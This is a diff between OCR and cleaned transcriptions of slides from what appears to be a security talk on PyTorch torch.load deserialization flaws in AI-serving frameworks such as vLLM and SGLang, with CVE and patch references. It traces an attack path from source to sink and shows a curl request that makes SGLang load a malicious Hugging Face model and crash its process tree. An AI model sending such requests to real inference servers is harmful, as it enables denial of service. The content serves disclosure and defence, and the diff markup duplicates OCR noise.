-torch.serialization._maybe_decode_ascii(pid[@]) != "storage"
-):
-raise UnpicklingError(
-+ f"Only persistent_load of storage is
-allowed, but got|{type(pid[0])}"
-)
-self.append(self.persistent_load(pid) )
-elif key[0] in [BINGET[@], LONG_BINGET[Q]]:
-98
-```
 
 ## Slide 99
 
 ### **Change the Security Statement**
 
-99
+**Closed** — **Document limitations of weights_only in SECURITY.md and torch.load doc** #165645
 
-https://github.com/pytorch/pytorch/pull/165645/
+All commits ▾ | **mikaylagawarecki** wants to merge 5 commits into `gh/mikaylagawarecki/355/b…` from `gh/mikaylagawarecki/355/…`
 
+**0 / 3** viewed | **Submit comments** ▾
 
-> Recovered by OCR — confidence 91/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+Filter files…
 
-```text
-“Change the Security Statement
-Q Filter files... —
-serialization.rst
-serialization.py
-(2) SECURITY.md
-Document limitations of weights_only in SECURITY.md and torch.load doc #165645
-mikaylagawarecki wants to merge 5 commits into gh/mikay lagawarecki/355/b.. from gh/mikaylagawarecki/355/... (O
+- docs/source/notes
+  - serialization.rst
+- torch
+  - serialization.py
+- SECURITY.md
+
+**SECURITY.md** — +2 -2 · ☐ Viewed
+
+Left side (before):
+
+```markdown
+        environment such as a sandbox** (e.g., containers, virtual
+        machines). This helps protect your system from potentially
+        malicious code. You can find further details and instructions
+        in [this page](https://developers.google.com/code-sandboxing).
 33
-34
-35
+34 -    **Be mindful of risky model formats**. Give preference to
+        share and load weights with the appropriate format for your
+        use case. [safetensors]
+        (https://huggingface.co/docs/safetensors/en/index) gives the
+        most safety but is the most restricted in what it supports.
+        [`torch.load`]
+        (https://pytorch.org/docs/stable/generated/torch.load.html#tor
+        ch.load) with `weights_only=True` is also secure to our
+        knowledge even though it offers significantly larger surface
+        of attack. Loading un-trusted checkpoint with
+        `weights_only=False` MUST never be done.
+35 -
 36
-environment such as a sandbox** (e.g., containers, virtual
-machines). This helps protect your system from potentially
-malicious code. You can find further details and instructions
-in [this page] (https://developers.google.com/code-sandboxing).
-— **Be mindful of risky model formats**. Give preference to
-share and load weights with the appropriate format for your
-use case. [safetensors]
-most safety but is the most restricted in what it supports.
-ch. load) with ‘weights_only=True~ is also secure to our
-knowledge even though it offers significantly larger surface
-of attack. Loading un-trusted checkpoint with
-‘weights_only=False* MUST never be done.
-33
-34
-35
-36
-0/3 viewed
-Submit comments v
-environment such as a sandbox** (e.g., containers, virtual
-machines). This helps protect your system from potentially
-malicious code. You can find further details and instructions
-in [this page] (https: //developers.google. com/code-sandboxing) .
-**Be mindful of risky model formats**. Give preference to
-share and load weights with the appropriate format for your
-use case. [safetensors]
-most safety but is the most restricted in what it supports.
-ch.load) has a significantly larger surface of attack but is
-more flexible in what it can serialize. See the documentation
-for more details.
-Even for more secure serialization formats, unexpected inputs
-to the downstream system can cause diverse security threats
-(e.g. denial of service, out of bound reads/writes) and thus
-we recommend extensive validation of any untrusted inputs.
-99
-https://github.com/pytorch/pytorch/pull/165645/
 ```
+
+Right side (after):
+
+```markdown
+        environment such as a sandbox** (e.g., containers, virtual
+        machines). This helps protect your system from potentially
+        malicious code. You can find further details and instructions
+        in [this page](https://developers.google.com/code-sandboxing).
+33
+34 +    **Be mindful of risky model formats**. Give preference to
+        share and load weights with the appropriate format for your
+        use case. [safetensors]
+        (https://huggingface.co/docs/safetensors/en/index) gives the
+        most safety but is the most restricted in what it supports.
+        [`torch.load`]
+        (https://pytorch.org/docs/stable/generated/torch.load.html#tor
+        ch.load) has a significantly larger surface of attack but is
+        more flexible in what it can serialize. See the documentation
+        for more details.
+35
+36 +    Even for more secure serialization formats, unexpected inputs
+        to the downstream system can cause diverse security threats
+        (e.g. denial of service, out of bound reads/writes) and thus
+        we recommend extensive validation of any untrusted inputs.
+```
+
+99
+
+https://github.com/pytorch/pytorch/pull/165645/
 
 ## Slide 100
 
 ### **Final Fix**
 
-100
+**russellb** commented on Mar 10 — Member
 
-
-> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-"Final Fix
-re russellb commented on Mar 10 Member °*°
 torch 2.10 is in use as of v0.17.0.
+
 Since it's already published as part of a torch CVE, I'm not sure we need to publish an advisory here.
+
 https://nvd.nist.gov/vuln/detail/CVE-2026-24747
-@ @ russellb closed this on Mar 10
-re russellb commented on Mar 10 Member °°*
-I'm going to close this out now that a release is out with 2.10. Since pytorch has their own CVE already published, | don't think
-we need to publish a separate one.
+
+**russellb** closed this on Mar 10
+
+**russellb** commented on Mar 10 — Member
+
+I'm going to close this out now that a release is out with 2.10. Since pytorch has their own CVE already published, I don't think we need to publish a separate one.
+
 Thanks again for the report.
+
 100
-```
 
 ## Slide 101
+
+PART 04
 
 One Chain, All Owned
 
@@ -3232,360 +3045,366 @@ One Chain, All Owned
 
 ### **Motivation Behind This Feature**
 
-103
+Home > User Guide > Features
 
-https://docs.vllm.ai/en/latest/features/prompt_embeds/
+### Prompt Embedding Inputs
 
-
-> Recovered by OCR — confidence 96/100 on the text kept, 96/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-"Motivation Behind This Feature
-Home User Guide Features
-Prompt Embedding Inputs
 This page teaches you how to pass prompt embedding inputs to vLLM.
-What are prompt embeddings?
-The traditional flow of text data for a Large Language Model goes from text to token ids (via a
-tokenizer) then from token ids to prompt embeddings. For a traditional decoder-only model (such
-as meta-llama/Llama-3.1-8B-Instruct), this step of converting token ids to prompt embeddings
-happens via a look-up from a learned embedding matrix, but the model is not limited to
-processing only the embeddings corresponding to its token vocabulary.
+
+### What are prompt embeddings?
+
+The traditional flow of text data for a Large Language Model goes from text to token ids (via a tokenizer) then from token ids to prompt embeddings. For a traditional decoder-only model (such as meta-llama/Llama-3.1-8B-Instruct), this step of converting token ids to prompt embeddings happens via a look-up from a learned embedding matrix, but the model is not limited to processing only the embeddings corresponding to its token vocabulary.
+
 103
+
 https://docs.vllm.ai/en/latest/features/prompt_embeds/
-```
 
 ## Slide 104
 
 ### **Motivation Behind This Feature**
 
-104
+### Prompt Embeddings
 
-https://docs.nvidia.com/nim/large-language-models/latest/advanced-use-cases/prompt-embeds.html
+NVIDIA NIM for Large Language Models supports prompt embeddings, also known as prompt embeds, as a secure alternative to traditional text prompts. Applications can use precomputed embeddings for inference to support more flexible prompt engineering and improve privacy and data security. With prompt embeddings, applications transform sensitive user data into embeddings before sending requests to the inference server, which reduces the risk of exposing confidential information during the AI workflow.
 
-
-> Recovered by OCR — confidence 96/100 on the text kept, 96/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-"Motivation Behind This Feature
-Prompt Embeddings
-NVIDIA NIM for Large Language Models supports prompt embeddings, also known as prompt embeds,
-as a secure alternative to traditional text prompts. Applications can use precomputed embeddings for
-inference to support more flexible prompt engineering and improve privacy and data security. With
-prompt embeddings, applications transform sensitive user data into embeddings before sending
-requests to the inference server, which reduces the risk of exposing confidential information during the
-Al workflow.
 Prompt embeddings support the following use cases:
-Privacy-Preserving Al: Convert sensitive prompts to embeddings before sending them to the server.
-Custom Embedding Models: Use specialized, domain-specific embedding models.
-Embedding Caching: Precompute and cache frequently used embeddings.
-Advanced Prompt Engineering: Implement sophisticated preprocessing pipelines.
-Multistage Pipelines: Integrate with proxy services that operate on embeddings.
-For background information about prompt embeddings, refer to the vLLM Prompt Embeds
-documentation.
+
+- **Privacy-Preserving AI**: Convert sensitive prompts to embeddings before sending them to the server.
+- **Custom Embedding Models**: Use specialized, domain-specific embedding models.
+- **Embedding Caching**: Precompute and cache frequently used embeddings.
+- **Advanced Prompt Engineering**: Implement sophisticated preprocessing pipelines.
+- **Multistage Pipelines**: Integrate with proxy services that operate on embeddings.
+
+For background information about prompt embeddings, refer to the vLLM Prompt Embeds documentation.
+
 104
+
 https://docs.nvidia.com/nim/large-language-models/latest/advanced-use-cases/prompt-embeds.html
-```
 
 ## Slide 105
 
 ### **Other Affected Components**
 
+*Logos of affected AI-serving projects: vLLM, OpenLLM, NVIDIA Dynamo, SGLang (SGL), and Comfy.*
+
+NVIDIA Dynamo banner — "AI Inference / NVIDIA Dynamo / Scale and Serve Generative AI, Fast." with layered component labels: API Server, GPU Planner, Smart Router, Cache Manager, Communication Library
+
 105
-
-
-> Recovered by OCR — confidence 92/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-a
-Other Affected Components
-Al Inference
-NVIDIA Dynamo
-Scale and Serve Generative Al, Fast. Gs
-105
-```
 
 ## Slide 106
 
 ### **What is OpenLLM?**
 
-106
+*OpenLLM logo.*
 
+**💪 OpenLLM: Self-Hosting LLMs Made Easy**
 
-> Recovered by OCR — confidence 92/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+`License | Apache 2`  `PyPI | v0.6.30`  `pre-commit.ci | passed`  `Follow | @bentomlai`  `Join | Community`
 
-```text
-“What is OpenLLM?
-é» OpenLLM: Self-Hosting LLMs Made Easy
-OpenLLM allows developers to run any open-source LLMs (Llama 3.3, Qwen2.5, Phi3 and more) or
-custom models as OpenAl-compatible APIs with a single command. It features a built-in chat Ul, state-
-of-the-art inference backends, and a simplified workflow for creating enterprise-grade cloud deployment
-with Docker, Kubernetes, and BentoCloud.
+OpenLLM allows developers to run **any open-source LLMs** (Llama 3.3, Qwen2.5, Phi3 and more) or **custom models** as **OpenAI-compatible APIs** with a single command. It features a built-in chat UI, state-of-the-art inference backends, and a simplified workflow for creating enterprise-grade cloud deployment with Docker, Kubernetes, and BentoCloud.
+
 Understand the design philosophy of OpenLLM.
+
 106
-```
 
 ## Slide 107
 
 ### **Configuration**
 
-107
-
-https://github.com/bentoml/openllm-models
-
-
-> Recovered by OCR — confidence 88/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+*GitHub file view — breadcrumb:* **main** › openllm-models / bentoml / bentos / llama3.1 / 8b-instruct-239c / **bento.yaml** *· tabs: Code | Blame*
 
 ```text
-“Configuration
-tg ¥ main ~ — openllm-models / bentom! / bentos / llama3.1 / 8b-instruct-239c / bento.yaml
-Code Blame
-68 type: string
-69 is_stream: true
-70 media_type: text/event-stream
-71 is_task: false
-72 args: {}
-73 spec: 2
-74 image:
-75 base_image: python:3.11-slim
-76 python_version: '3.11'
-77 commands:
-78 - apt-get update && apt-get install -q -y --no-install-recommends --allow-remove-essential
-79 ca-certificates gnupg2 bash build-essential git
-80 python_requirements: 'bentoml==1.4.12
+68        type: string
+69        is_stream: true
+70        media_type: text/event-stream
+71      is_task: false
+72    args: {}
+73    spec: 2
+74    image:
+75      base_image: python:3.11-slim
+76      python_version: '3.11'
+77      commands:
+78      - apt-get update && apt-get install -q -y --no-install-recommends --allow-remove-essential
+79        ca-certificates gnupg2 bash build-essential git
+80      python_requirements: 'bentoml==1.4.12
 81
-82 vllm==0.8.5
+82        vllm==0.8.5
 83
-84 fastapi==0.115.4
+84        fastapi==0.115.4
 85
-86 pydantic==2.11.1
+86        pydantic==2.11.1
 87
-88 openai==1.69.0
+88        openai==1.69.0
 89
-90 bentoml==1.4.12
-107
-https://github.com/bentoml/openllm-models
+90        bentoml==1.4.12
 ```
+
+*(line 82 `vllm==0.8.5` is highlighted in red)*
+
+https://github.com/bentoml/openllm-models
+
+107
 
 ## Slide 108
 
 ### **Architecture**
 
+*Diagram. Outer dashed box labeled* **OpenLLM** *contains:*
+
+- **OpenLLM CLI + BentoML + openllm-models** — packaging / config / deployment
+- ↓ *transparent proxy*
+- **vLLM OpenAI-Compatible Server** — vllm.entrypoints.openai.api_server
+  - /v1/chat/completions
+  - /v1/completions
+  - /v1/embeddings
+  - /v1/models
+
 108
-
-
-> Recovered by OCR — confidence 86/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-"Architecture
-OpenLLM
-OpenLLM CLI + BentoML + openllm-models
-packaging / config / deployment
-vLLM OpenAl-Compatible Server
-vilm.entrypoints.openai.api_server
-/v1/chat/completions /v1/completions
-[ /vi/embeddings | /v1/models
-108
-```
 
 ## Slide 109
 
 ### **Source -> Sink**
 
-109
-
-
-> Recovered by OCR — confidence 85/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
 ```text
-Source -> Sink
 HTTP POST /v1/chat/completions
-payload: {"type": “image_embeds", "“image_embeds": "<base64-data>"}
-|
-|
-|
-— serving_chat.py:121 create_chat_completion()
-| L line 183: self._preprocess_chat(...)
-| L parse_chat_messages_futures(messages, ...)
-|
-[+ chat_utils.py:1155 parse_chat_messages_futures()
-| L line 1165: _parse_chat_message_content(message, ...)
-|
-|» chat_utils.py:1075 _parse_chat_message_content()
-| L line 1089: _parse_chat_message_content_parts(parts, ...)
-|
-— chat_utils.py:977 _parse_chat_message_content_parts()
-| L line 989: _parse_chat_message_content_part(part, ...)
-— chat_utils.py:1010 _parse_chat_message_content_part()
-| L line 1048-1051: if part_type == "image_embeds":
-|
-— chat_utils.py:749 AsyncMultiModalContentParser.parse_image_embeds()
-| L self._connector. fetch_image_embedding(image_embeds_str)
-— multimodal/utils.py:245 MediaConnector.fetch_image_embedding(data)
-| L ImageEmbeddingMediaI0().load_base64(""", data)
-|
-| L self. load_bytes (base64.b64decode(data) )
-|
-Ly multimodal/image.py:67-68 load_bytes(data) 109
-L torch. load(BytesI0(data), weights_only=True)
+    payload: {"type": "image_embeds", "image_embeds": "<base64-data>"}
+    |
+    ├─→ api_server.py:466          create_chat_completion(request, raw_request)
+    |
+    ├─→ serving_chat.py:121        create_chat_completion()
+    |     └ line 183:              self._preprocess_chat(...)
+    |
+    ├─→ serving_engine.py:403      _preprocess_chat()
+    |     └                        parse_chat_messages_futures(messages, ...)
+    |
+    ├─→ chat_utils.py:1155         parse_chat_messages_futures()
+    |     └ line 1165:             _parse_chat_message_content(message, ...)
+    |
+    ├─→ chat_utils.py:1075         _parse_chat_message_content()
+    |     └ line 1089:             _parse_chat_message_content_parts(parts, ...)
+    |
+    ├─→ chat_utils.py:977          _parse_chat_message_content_parts()
+    |     └ line 989:              _parse_chat_message_content_part(part, ...)
+    |
+    ├─→ chat_utils.py:1010         _parse_chat_message_content_part()
+    |     └ line 1048-1051:        if part_type == "image_embeds":
+    |                                  mm_parser.parse_image_embeds(content)
+    |
+    ├─→ chat_utils.py:749          AsyncMultiModalContentParser.parse_image_embeds()
+    |     └                        self._connector.fetch_image_embedding(image_embeds_str)
+    |
+    ├─→ multimodal/utils.py:245    MediaConnector.fetch_image_embedding(data)
+    |     └                        ImageEmbeddingMediaIO().load_base64("", data)
+    |
+    ├─→ multimodal/image.py:70     load_base64(media_type, data)
+    |     └                        self.load_bytes(base64.b64decode(data))
+    |
+    └─→ multimodal/image.py:67-68  load_bytes(data)
+          └                        torch.load(BytesIO(data), weights_only=True)
 ```
+
+109
 
 ## Slide 110
 
 ### **What is SGLang?**
 
+*SGLang (SGL) logo.*
+
+`pypi | v0.5.13`  `downloads | 834M`  `license | Apache-2.0`  `closed issues | 5.5k`  `open issues | 658`  `Ask DeepWiki`
+
+### About
+
+SGLang is a high-performance serving framework for large language models and multimodal models. It is designed to deliver low-latency and high-throughput inference across a wide range of setups, from a single GPU to large distributed clusters. Its core features include:
+
 110
-
-
-> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-“What is SGLang?
-SGIL
-pypi v0.5.13 § downloads 834M § license /Apache-2:0 § closed issues [595 Ask DeepWiki
-About
-SGLang is a high-performance serving framework for large language models and multimodal models. It is designed
-to deliver low-latency and high-throughput inference across a wide range of setups, from a single GPU to large
-distributed clusters. Its core features include:
-110
-```
 
 ## Slide 111
 
 ### **Source -> Sink**
 
-111
+*Two side-by-side code panels connected by red arrows. Left panel top → right panel middle → left panel bottom.*
 
-
-> Recovered by OCR — confidence 91/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
+Endpoint handler:
 ```text
-Source -> Sink
-@app.post("/update_weights_from_disk") @dataclass
-@auth_level(AuthLevel. ADMIN_OPTIONAL) klass UpdateWeightFromDiskReqInput (BaseReq)
-async def update_weights_from_disk(obj: UpdateWeightFromDiskReqInput, request: Request): # The model path with the new weights
-"""Update the weights from disk inplace without re-launching the server.""" | model_path: str
-( # The format to load the weights
-success, load_format: Optional[str] = None
-message, # Whether to abort all requests before updating weights
-num_paused_requests, abort_all_requests: bool = False
-) = await _global_state.tokenizer_manager.update_weights_from_disk(obj, request)
-if not is_local:
-hf_folder = download_weights_from_hf (
-model_name_or_path,
-allow_patterns,
-def _load_pt_file(bin_file: str) -> dict:
-"""load a PyTorch checkpoint file, handling legacy tar format. ignore_patterns=self. load_config. ignore_patterns,
-PyTorch 2.6 changed the default of weights_only from False to True.
-Legacy tar format files cannot be loaded with weights_only=True.
-This function tries weights_only=True first, then falls back to False
-for legacy tar format files from trusted sources (HuggingFace Hub).
-try:
-return torch. load(bin_file, map_location="cpu", weights_only=True)
-111
+@app.post("/update_weights_from_disk")
+@auth_level(AuthLevel.ADMIN_OPTIONAL)
+async def update_weights_from_disk(obj: UpdateWeightFromDiskReqInput, request: Request):
+    """Update the weights from disk inplace without re-launching the server."""
+    (
+        success,
+        message,
+        num_paused_requests,
+    ) = await _global_state.tokenizer_manager.update_weights_from_disk(obj, request)
 ```
+
+Request dataclass:
+```text
+@dataclass
+class UpdateWeightFromDiskReqInput(BaseReq):
+    # The model path with the new weights
+    model_path: str
+    # The format to load the weights
+    load_format: Optional[str] = None
+    # Whether to abort all requests before updating weights
+    abort_all_requests: bool = False
+```
+*(`model_path: str` is highlighted in red)*
+
+Weight download:
+```text
+if not is_local:
+    hf_folder = download_weights_from_hf(
+        model_name_or_path,
+        self.load_config.download_dir,
+        allow_patterns,
+        revision,
+        ignore_patterns=self.load_config.ignore_patterns,
+    )
+```
+
+Checkpoint loader:
+```text
+def _load_pt_file(bin_file: str) -> dict:
+    """Load a PyTorch checkpoint file, handling legacy tar format.
+
+    PyTorch 2.6 changed the default of weights_only from False to True.
+    Legacy tar format files cannot be loaded with weights_only=True.
+    This function tries weights_only=True first, then falls back to False
+    for legacy tar format files from trusted sources (HuggingFace Hub).
+    """
+    try:
+        return torch.load(bin_file, map_location="cpu", weights_only=True)
+```
+
+111
 
 ## Slide 112
 
 ### **Motivation Behind This Feature**
 
-112
+### Update Weights From Disk
 
-https://docs.sglang.io/docs/basic_usage/native_api
+Update model weights from disk without restarting the server. Only applicable for models with the same architecture and parameter size.
 
+SGLang support `update_weights_from_disk` API for continuous evaluation during training (save checkpoint to disk and update weights from disk).
 
-> Recovered by OCR — confidence 93/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-‘Motivation Behind This Feature
-Update Weights From Disk
-Update model weights from disk without restarting the server. Only applicable for
-models with the same architecture and parameter size.
-SGLang support update_weights_from_disk API for continuous evaluation during
-training (save checkpoint to disk and update weights from disk).
-Example oO >
+Example:
+```python
 # successful update with same architecture and size
-url = f"http://Localhost:{port}/update_weights_from_disk"
+url = f"http://localhost:{port}/update_weights_from_disk"
 data = {"model_path": "qwen/qwen2.5-0.5b-instruct"}
+
 response = requests.post(url, json=data)
 print_highlight(response.text)
 assert response.json()["success"] is True
 assert response.json()["message"] == "Succeeded to update model weights."
-112
-https://docs.sglang.io/docs/basic_usage/native_api
 ```
+
+https://docs.sglang.io/docs/basic_usage/native_api
+
+112
 
 ## Slide 113
 
 ### **Crash? Why?**
 
-113
-
-
-> Recovered by OCR — confidence 88/100 on the text kept, 82/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
-
+Launch command:
 ```text
-"Crash? Why?
-python -m sglang. launch_server curl -s http://localhost:30000/update_weights_from_disk
---model-path {{model}} --host 0.0.0.0 --port 30000 “H ‘Content-Type: application/json’
--d '{"model_path":"{{evil_model_on_hf}}",
-"flush_cache":true}'
-return torch.load(bin_file, map_location="cpu", weights_only=True)
-File "/home/. |/Desktop/(G."..8l" Sia" venv/lib/python3.12/site-packages/torch/serialization.py", line 1529, in load
-raise pickle.UnpicklingError(_get_wo_message(str(e))) from None
-_pickle.UnpicklingError: Weights only load failed. In PyTorch 2.6, we changed the default value of the ‘weights_only* argument in ‘torch.load* from ‘False* to ‘T:
-t to ‘False’ will likely succeed, but it can result in arbitrary code execution. Do it only if you got the file from a trusted source.
-Please file an issue with the following so that we can make ‘weights_only=True* compatible with your use case: WeightsUnpickler error:
-Only persistent_load of storage is allowed, but got tensor([ 1, 2; 3
-10, 7957695013524078592, 85,
-131459831146098, 6049905579691883710, 131458154763392,
-Q, 131428549404288, 131428549404272,
-131457927717654, 131457927713888, 7598545042164156230,
-85, 131459831146274, 6049905579691883710,
-131458154763392, e, 131428549394433,
-131428549420688, 131428549420800, 131428549421208]
+python -m sglang.launch_server
+  --model-path {{model}} --host 0.0.0.0  --port 30000
+```
+
+Attack request:
+```text
+curl -s http://localhost:30000/update_weights_from_disk
+        -H 'Content-Type: application/json'
+          -d '{"model_path":"{{evil_model_on_hf}}",
+                "flush_cache":true}'
+```
+
+Terminal output:
+```text
+    return torch.load(bin_file, map_location="cpu", weights_only=True)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/[...]/Desktop/[...] venv/lib/python3.12/site-packages/torch/serialization.py", line 1529, in load
+    raise pickle.UnpicklingError(_get_wo_message(str(e))) from None
+_pickle.UnpicklingError: Weights only load failed. In PyTorch 2.6, we changed the default value of the `weights_only` argument in `torch.load` from `False` to `T[...]
+t to `False` will likely succeed, but it can result in arbitrary code execution. Do it only if you got the file from a trusted source.
+Please file an issue with the following so that we can make `weights_only=True` compatible with your use case: WeightsUnpickler error:
+
+Only persistent_load of storage is allowed, but got tensor([                 1,                   2,                   3,
+                 4,                   5,                   6,
+                 7,                   8,                   9,
+                10, 7957695013524078592,                  85,
+   131459831146098, 6049905579691883710,     131458154763392,
+                 0,     131428549404288,     131428549404272,
+   131457927717654,     131457927713888, 7598545042164156230,
+                85,     131459831146274, 6049905579691883710,
+   131458154763392,                   0,     131428549394433,
+   131428549420688,     131428549420800,     131428549421208])
+
 Check the documentation of torch.load to learn more about types accepted by default with weights_only https://pytorch.org/docs/stable/generated/torch.load.html.
+
 [2026-06-28 21:09:01] SIGQUIT received. signum=None, frame=None. It usually means one child failed.
 Killed
-113
 ```
+
+113
 
 ## Slide 114
 
 ### **The Difference**
 
-114
-
-
-> Recovered by OCR — confidence 89/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+**vLLM: Survives — Exception stays in-process**
 
 ```text
-"The Difference
-vLLM: Survives — Exception stays in-process
 HTTP Request
-> torch.load() throws UnpicklingError
-> except Exception catches it SGLang: Dies — Exception crosses process boundary
-> Returns HTTP 50@ with error message
-> Server stays alive HTTP Process > ZMQ > Scheduler > ZMQ > Worker Process
-v
-torch.load() throws
-UnpicklingError
-@router.post("/v1/completions") v
-async def create_completion(request: CompletionRequest, raw_request: Request): No try/except on rollback
-handler = completion(raw_request) Lb
-a Worker process exits
-try: Lv
-generator = await handler.create_completion(request, raw_request) %
-_ Scheduler receives SIGQUIT
-except Exception as e: #UnpicklingError IS a subclass of Exception v
-raise HTTPException(status_code=HTTPStatus. INTERNAL_SERVER_ERROR. value, Kills entire process tree x
-detail=str(e)) from e
-async def http_exception_handler(_: Request, exc: HTTPException):
-err = ErrorResponse(
-error=ErrorInfo(message=exc.detail,
-code=exc.status_code) )
-return JSONResponse(err.model_dump(), status_code=exc.status_code)
-114
+  → torch.load() throws UnpicklingError
+  → except Exception catches it
+  → Returns HTTP 500 with error message
+  → Server stays alive ✅
 ```
+
+```text
+@router.post("/v1/completions")
+async def create_completion(request: CompletionRequest, raw_request: Request):
+    handler = completion(raw_request)
+    ...
+    try:
+        generator = await handler.create_completion(request, raw_request)
+    ...
+    except Exception as e:  #UnpicklingError IS a subclass of Exception
+        raise HTTPException(status_code=HTTPStatus.INTERNAL_SERVER_ERROR.value,
+                            detail=str(e)) from e
+
+@app.exception_handler(HTTPException)
+    async def http_exception_handler(_: Request, exc: HTTPException):
+        err = ErrorResponse(
+            error=ErrorInfo(message=exc.detail,
+                            type=HTTPStatus(exc.status_code).phrase,
+                            code=exc.status_code))
+        return JSONResponse(err.model_dump(), status_code=exc.status_code)
+```
+
+**SGLang: Dies — Exception crosses process boundary**
+
+```text
+HTTP Process → ZMQ → Scheduler → ZMQ → Worker Process
+                          ↓
+                  torch.load() throws
+                  UnpicklingError
+                          ↓
+                  No try/except on rollback
+                          ↓
+                  Worker process exits
+                          ↓
+                  Scheduler receives SIGQUIT
+                          ↓
+                  Kills entire process tree ❌
+```
+
+114
 
 ## Slide 115
 
@@ -3597,49 +3416,39 @@ return JSONResponse(err.model_dump(), status_code=exc.status_code)
 
 ### **Upgrade PyTorch Version to Resolve This Issue**
 
-116
-
-
-> Recovered by OCR — confidence 82/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+*GitHub file view — breadcrumb:* **sglang** / python / **pyproject.toml** *· tabs: Code | Blame · Executable File · 231 lines (211 lo...)*
 
 ```text
-“Upgrade PyTorch Version to Resolve This Issue
-sglang / python / pyproject.toml (O
-Code Blame Executable File + 231 lines (211 lo
-75 “torch==2.11.0",
-76 "torch_memory_saver>=0.0.9.post1",
-77 "torchao==0.17.0",
-78 “torchaudio==2.11.0",
-79 "torchcodec==0.11.1 ; sys_platform != 'li
-80 "torchvision",
-82 "transformers==5.12.1",
-83 “uvicorn",
-85 "watchfiles",
-86 "xgrammar==0.2.1",
-87 "zstandard",
-88 ]
-116
+75      "torch==2.11.0",
+76      "torch_memory_saver>=0.0.9.post1",
+77      "torchao==0.17.0",
+78      "torchaudio==2.11.0",
+79      "torchcodec==0.11.1 ; sys_platform != 'li
+80      "torchvision",
+81      "tqdm",
+82      "transformers==5.12.1",
+83      "uvicorn",
+84      "uvloop",
+85      "watchfiles",
+86      "xgrammar==0.2.1",
+87      "zstandard",
+88    ]
 ```
+
+116
 
 ## Slide 117
 
 ### **What is ComfyUI?**
 
+*ComfyUI logo.*
+
+The most powerful and modular visual AI engine and application.
+
+`ComfyOrg`  `Discord | 55128 total`  `Follow @ComfyUI`  `[m] Matrix`
+`release | v0.19.0`  `release date | last monday`  `downloads | 3.8M`  `downloads@latest | 19k`
+
 117
-
-
-> Recovered by OCR — confidence 81/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-“What is ComfyUI?
-The most powerful and modular visual Al engine and application.
-X Follow @ComfyUI
-downloads@latest 9K}
-ComfyOrg
-release v0.19.0
-release date last monday § downloads 3.8M |
-117
-```
 
 ## Slide 118
 
